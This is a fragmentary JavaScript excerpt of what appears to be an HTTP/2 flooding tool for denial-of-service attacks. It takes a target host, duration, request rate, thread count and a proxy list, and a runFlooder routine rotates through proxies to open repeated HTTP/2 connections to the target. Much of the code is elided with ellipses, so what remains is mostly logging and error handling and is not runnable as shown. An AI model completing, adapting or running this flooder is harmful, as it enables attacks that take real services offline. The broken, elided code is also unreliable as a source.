...
const secureOptions =
 ...
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`.brightRed); process.exit();}
...
if (cluster.isMaster) {
    ...
    const handleRAMUsage = () => {
        ...
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('Max RAM usage reached: '.brightYellow + ramPercentage.toFixed(2) + '%');
            restartScript();
        }
    };
 ...
 class NetSocket {
  ...
  HTTP(options, callback) {
   ...
   connection.on("data", chunk => {
       ...
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server".brightRed);
       }
   ...
   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded".brightRed);
   });
...
const randstrsValue = randstrs(10);
  function runFlooder() {
    ...
    while (attempts < maxAttempts) {
        ...
        console.log(`Trying proxy: ${proxyAddr}`.brightGreen);
    ...
    let headers = {
     ...
     Socker.HTTP(proxyOptions, (conn, err) => {
        if (err) {
          console.log(`Proxy connection error: ${err}`.brightRed);
          attempts++;
          return;
        } else {
            connection = conn;
    ...
    if (connection) {
        console.log(`Connected via proxy: ${proxyAddr}`.brightBlue);
        connection.setKeepAlive(true, 1000);
        connection.setNoDelay(true)
    ...
    client.settings(settings);
        client.on("connect", () => {
          console.log(`HTTP/2 connected to ${parsedTarget.host}`.brightCyan);
    ...
    const request = client.request({
        ...
        client.on("close", () => {
          console.log(`Connection closed`.brightYellow);
          client.destroy();
          tlsConn.destroy();
          connection.destroy();
          return
      ...
      client.on("timeout", () => {
        console.log(`Connection timeout`.brightRed);
        client.destroy();
        connection.destroy();
        return
    });
      client.on("error", error => {
    console.log(`Client error: ${error}`.brightRed);
    client.destroy();
    connection.destroy();
    return
    });
    } else {
        console.log(`No valid proxy found after ${attempts} attempts`.brightRed);
    }
}
}
